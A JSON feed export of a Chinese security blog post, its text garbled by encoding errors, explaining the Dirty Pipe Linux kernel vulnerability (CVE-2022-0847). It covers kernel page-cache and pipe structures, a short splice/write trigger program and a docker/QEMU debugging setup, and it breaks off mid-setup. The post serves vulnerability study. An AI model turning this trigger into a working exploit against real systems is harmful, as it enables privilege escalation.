{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog â€¢ All posts by \"cve recur\" category",
    "description": "introvert",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "url": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "title": "CVE-2022-0847-DIRTY-PIPE-detail",
            "date_published": "2022-11-02T14:19:00.000Z",
            "content_html": "<h1 id=\"basic\"><a class=\"markdownIt-Anchor\" href=\"#basic\">#</a> basic</h1>\n<p>(ä¹‹åä¼šæŠŠ docker åšå¥½ä¼ ä¸Šå» ä»¥åå°±ä¸ç”¨æŠ˜è…¾äº† QAQ)</p>\n<h2 id=\"page-cache\"><a class=\"markdownIt-Anchor\" href=\"#page-cache\">#</a> page cache</h2>\n<p>Linux çš„æ¢é¡µæœºåˆ¶æ˜¯è„é¡µæœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯å†™ä¸€ä¸ªæ–‡ä»¶æ˜¯é€šè¿‡å†™å†…å­˜ç¼“å­˜é¡µï¼Œç„¶åæ ‡è®°è„ä½ï¼Œåœ¨æ¢é¡µçš„æ—¶å€™ä¸€æ¬¡æ€§å†™å›ç£ç›˜ã€‚è€Œä¸æ˜¯æ¯æ¬¡éƒ½å†™ç£ç›˜ã€‚<br>\nåœ¨æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ç”¨ <code>O_DIRECT | O_SYNC</code>  æ¥æ ‡è®°å¯¹è„é¡µè¿›è¡Œç›´å†™ç­–ç•¥ï¼Œæ¢å›åŒæ­¥ã€‚<br>\nä½†è¿™é‡Œå¹¶ä¸æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œç¡¬å­˜çº§åˆ«çš„ç¯¡æ”¹ï¼Œå‡è®¾æ–‡ä»¶è¿›äº†å†…å­˜ï¼Œç„¶åæˆ‘ä¿®æ”¹äº†è¿™ä¸ªæ–‡ä»¶å†…å­˜ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼ŒçŸ­æ—¶é—´å†æ¬¡è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¼šç›´æ¥ä»å†…å­˜ç¼“å­˜ä¸­æ‹¿åˆ°æˆ‘ä»¬ç¯¡æ”¹è¿‡çš„å†…å®¹è€Œä¸æ˜¯å» disk ä¸Šå–ã€‚</p>\n<h2 id=\"structs\"><a class=\"markdownIt-Anchor\" href=\"#structs\">#</a> structs</h2>\n<h3 id=\"file\"><a class=\"markdownIt-Anchor\" href=\"#file\">#</a> file</h3>\n<p><a href=\"https://elixir.bootlin.com/linux/v5.13-rc1/source/include/linux/fs.h#L920\">fs.h - include/linux/fs.h - Linux source code (v5.13-rc1) - Bootlin</a><br>\n æ¯ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ª struct ç›¸å¯¹åº”</p>\n<ul>\n<li>pipe_inode_info æŒ‡å‘ä¸€ä¸ªå†…æ ¸ç®¡é“</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> &#123;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">path</span>                  <span class=\"title\">f_path</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>                 *<span class=\"title\">f_inode</span>;</span></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> *<span class=\"title\">f_op</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span>         *<span class=\"title\">f_mapping</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">\t <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> Â  Â *<span class=\"title\">i_pipe</span>;</span></span><br><span class=\"line\">... </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>å…¶ä¸­çš„ address_space æŒ‡ç¤ºäº†è¿™ä¸ªæ–‡ä»¶å†…å®¹çš„æ˜ å°„ä½ç½®</p>\n<h3 id=\"address_space\"><a class=\"markdownIt-Anchor\" href=\"#address_space\">#</a> address_space</h3>\n<p>address_space çš„ä½œç”¨å°±æ˜¯å°†æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„æ•°æ®ä¹Ÿ<strong> page</strong> çš„æ–¹å¼è¿ç»­åœ°å‘ˆç°å‡ºæ¥ï¼Œ è¿™æ ·è¯»å–æ–‡ä»¶çš„æ“ä½œä¾¿è½¬æ¢æˆäº†å…ˆå°†ä¸è¿ç»­çš„ç£ç›˜ä¸Šçš„å†…å®¹è¯»å–çš„ page ä¸­ï¼Œ å†ä»è¿ç»­çš„ page ä¸­å»è¯»å–è¿ç»­çš„æ•°æ®ã€‚</p>\n<ul>\n<li>i_pages: ç¼“å­˜é¡µç»„ (æ˜¯ä¸€ä¸ª eXtend ARRAY)</li>\n<li>nrpages: é¡µè¡¨å…¥å£çš„å¤§å°</li>\n<li>a_ops: è®°å½•ç€å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œçš„è™šè¡¨æ–¹æ³• (glibc æ‰“ io æˆ–è€…å†…æ ¸æ‰“ ptmx ç±»ä¼¼)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>        *<span class=\"title\">host</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span>       <span class=\"title\">i_pages</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       nrpages;</span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span>             writeback_index;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space_operations</span> *<span class=\"title\">a_ops</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"xarray\"><a class=\"markdownIt-Anchor\" href=\"#xarray\">#</a> xarray</h3>\n<p>xarray æŒ‡å‘äº†å¤šä¸ª page ç»“æ„ä½“ ä¹Ÿå°±æ˜¯è¿™ä¸ªæ–‡ä»¶å­˜æ”¾åœ¨å“ªå‡ é¡µã€‚(è¿™é‡Œæ˜¯åº”è¯¥æ˜¯ä»¥__rcu ä¸ºé“¾è¡¨çš„å½¢å¼ å¾…éªŒè¯)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span>\txa_lock;</span><br><span class=\"line\"><span class=\"comment\">/* private: The rest of the data structure is not to be used directly. */</span></span><br><span class=\"line\">\t<span class=\"type\">gfp_t</span>\t\txa_flags;</span><br><span class=\"line\">\t<span class=\"type\">void</span> __rcu *\txa_head;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pipe_inode_info\"><a class=\"markdownIt-Anchor\" href=\"#pipe_inode_info\">#</a> pipe_inode_info</h3>\n<p>åœ¨ file é‡Œçš„å†…æ ¸ç®¡é“</p>\n<ul>\n<li>head æŒ‡å‘ç”Ÿäº§è€… buffer</li>\n<li>tail æŒ‡å‘æ¶ˆè´¹è€… buffer</li>\n<li>bufs å¾ªç¯ buffer çš„ä¸€ä¸ªé“¾è¡¨<br>\nè¿™é‡Œçš„ ring ä¼šè¢«è®¾ç½®ä¸º 16 ä¹Ÿå°±æ˜¯æœ‰ 16 ä¸ªå¾ªç¯ buf ä¾› pipe ä½¿ç”¨<br>\nç„¶å head å’Œ tail æ˜¯ç”¨äºåœ¨ bufs ä¸­åšç´¢å¼•çš„<br>\nä¾‹å¦‚ <code>&amp;pipe-&gt;bufs[(head - 1) &amp; mask];</code>  è¿™é‡Œçš„ mask å°±æ˜¯ ring-1.<br>\n å†…æ ¸ä¼šä¸ºä¸€ä¸ª pipe åˆ†é… 16 ä¸ª pipe_bufferï¼Œå¾ªç¯ç¼“å†²åŒº</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mutex</span> <span class=\"title\">mutex</span>;</span></span><br><span class=\"line\">    <span class=\"type\">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> tail;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_usage;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> ring_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t (Â·Â·Â·)</span><br><span class=\"line\">\t </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">bufs</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">watch_queue</span> *<span class=\"title\">watch_queue</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/1.png\" alt><br>\nï¼ˆå›¾ç‰‡æ¥æº breeze ğŸ’ï¼‰</p>\n<h3 id=\"pipe_buffer\"><a class=\"markdownIt-Anchor\" href=\"#pipe_buffer\">#</a> pipe_buffer</h3>\n<p>æ¯ä¸€ä¸ª buffer æŒ‡å‘ä¸€ä¸ª page</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> offset, len;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buf_operations</span> *<span class=\"title\">ops</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> private;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>page ç»“æ„ä½“</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"comment\">/* Page cache and anonymous pages */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> *<span class=\"title\">mapping</span>;</span></span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span> index;        <span class=\"comment\">/* Our offset within mapping. */</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">void</span> *virtual;    <span class=\"comment\">/* Kernel virtual address (NULL if</span></span><br><span class=\"line\"><span class=\"comment\">                       not kmapped, ie. highmem) */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/2.png\" alt></p>\n<h3 id=\"inode\"><a class=\"markdownIt-Anchor\" href=\"#inode\">#</a> inode</h3>\n<p>åœ¨ file çš„ç»“æ„ä½“ä¸­å¯ä»¥çœ‹åˆ° æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½æœ‰ inode (è¿™æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†æ–¹å¼)ï¼Œå¯¹äºç®¡é“ï¼Œä¹Ÿæœ‰è‡ªå·±çš„ inode</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> inode * <span class=\"title function_\">get_pipe_inode</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span> *<span class=\"title\">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!inode)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_inode;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_ino = get_next_ino();</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = alloc_pipe_info();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pipe)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_iput;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_pipe = pipe;            <span class=\"comment\">// inode æŒ‡å‘ä¸€ä¸ª pipe</span></span><br><span class=\"line\">\tpipe-&gt;files = <span class=\"number\">2</span>;                 <span class=\"comment\">// number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class=\"line\">\tpipe-&gt;readers = pipe-&gt;writers = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tinode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_state = I_DIRTY;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å…³äº pipe çš„åˆ›å»º</p>\n<ul>\n<li>ç”³è¯·äº†ä¸€ä¸ª pipe_inode_info ç»“æ„ä½“</li>\n<li>ç”³è¯·äº†å¤šä¸ª bufï¼Œä½†æ˜¯åªè¿”å›ä¸€ä¸ªæŒ‡å‘è¿™å¤šä¸ª buf çš„å¤´æŒ‡é’ˆï¼Œç›¸å½“äºå¯¹ä¸€ä¸ªé•¿åº¦çš„æ•°ç»„åšå¤´ç»“ç‚¹å’Œå°¾ç»“ç‚¹éƒ½ç§»åŠ¨çš„é“¾è¡¨ (æ•°æ®ç»“æ„å­¦è¿‡çš„é˜Ÿåˆ—é‚£å—)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> pipe_inode_info *<span class=\"title function_\">alloc_pipe_info</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span> =</span> get_current_user();</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> user_bufs;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = kzalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;bufs = kcalloc(pipe_bufs, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_buffer),</span><br><span class=\"line\">\t\t\t     GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe-&gt;bufs) &#123;</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class=\"line\">\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tpipe-&gt;max_usage = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;ring_size = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;nr_accounted = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;user = user;</span><br><span class=\"line\">\t\tmutex_init(&amp;pipe-&gt;mutex);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pipe;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"iov_iter\"><a class=\"markdownIt-Anchor\" href=\"#iov_iter\">#</a> iov_iter</h3>\n<p>iovec æ¥å£ç”¨äºå¤„ç†ç”¨æˆ·ä¼ å…¥çš„ç”¨æˆ·æ€ç¼“å­˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iov_iter</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 0 is the read/write bit, set if we&#x27;re writing.</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class=\"line\"><span class=\"comment\">\t * the caller isn&#x27;t expecting to drop a page reference when done.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> type;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> iov_offset;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> count;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span>&#123;</span></span><br><span class=\"line\">\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>åœ¨è¿™é‡Œåªç”¨åˆ°äº†ä¸€ä¸ª pipe å¯¹è±¡ (ä¹Ÿå°±æ˜¯ pipe å¯¹è±¡ç”± iov_iter è¿›è¡Œç®¡ç†æˆ–è€…è¯´æ˜¯æ›´å¤–ä¸€å±‚çš„å°è£…)ã€‚<br>\nåœ¨ PoC ä¸­ç”± copy_page_to_iter_pipe å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ® (page) å†™å…¥ iov_iter ç®¡ç†çš„ pipe ä¸­</p>\n<h2 id=\"demo\"><a class=\"markdownIt-Anchor\" href=\"#demo\">#</a> demo</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;AAAAAAAAAA&quot; &gt; foo</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">    splice(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"string\">&quot;BBBBB&quot;</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ./splicer &lt;foo |cat &gt;/dev/null</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"environment\"><a class=\"markdownIt-Anchor\" href=\"#environment\">#</a> environment</h1>\n<h2 id=\"docker\"><a class=\"markdownIt-Anchor\" href=\"#docker\">#</a> docker</h2>\n<p>æ‹‰ä¸‹ ubuntu20, æ¢ä¸ªæºå…ˆ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &quot;s/http:\\/\\/archive.ubuntu.com/http:\\/\\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list</span><br><span class=\"line\">apt-get update &amp;&amp; apt-get -y dist-upgrade</span><br></pre></td></tr></table></figure>\n<p>å¯åŠ¨å†…æ ¸çš„æ—¶å€™åƒä¸‡è¦æ³¨æ„ï¼ï¼</p>\n<ul>\n<li>å¢åŠ  SYS_PTRACEï¼ˆæ‰“å¼€è°ƒè¯•ï¼‰</li>\n<li>å¢åŠ ç«¯å£æ˜ å°„ï¼ˆè¿™æ ·æ‰èƒ½è®©å¤–éƒ¨ä¸»æœºè¿ä¸Š gdbï¼‰</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=mdp1 --cap-add=SYS_PTRACE -p 1234:1234 my_dirty_pipe:1.0 /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"other-tools\"><a class=\"markdownIt-Anchor\" href=\"#other-tools\">#</a> other tools</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alias agi=&quot;/bin/apt-get install -y&quot;</span><br><span class=\"line\">agi vim gdb gdbserver wget make gcc flex bison bc git cpio ninja-build pkg-config automake libtool</span><br><span class=\"line\">agi libncurses-dev openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf libglib2.0-dev</span><br><span class=\"line\">agi libpixman-1-dev python</span><br></pre></td></tr></table></figure>\n<h2 id=\"qemu\"><a class=\"markdownIt-Anchor\" href=\"#qemu\">#</a> qemu</h2>\n<p>ä¸€ä¸ªæŠ¥é”™çš„è§£å†³æ–‡æ¡£ <a href=\"https://hackmd.io/@vqXkRUAvSzWmuGTirpUnMQ/rkVhfCa-r\">QEMU contribution - HackMD</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class=\"line\">mkdir build &amp;&amp; cd build  # åœ¨ä¸‹è½½ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹buildï¼ˆè¿™æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºconfigureå‘½ä»¤å¿…é¡»åœ¨buildæ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œï¼‰</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ä»¥ä¸‹å‡åœ¨/buildç›®å½•ä¸‹</span></span><br><span class=\"line\">../configure</span><br><span class=\"line\">make  # ç¼–è¯‘æºç </span><br><span class=\"line\">make install  # 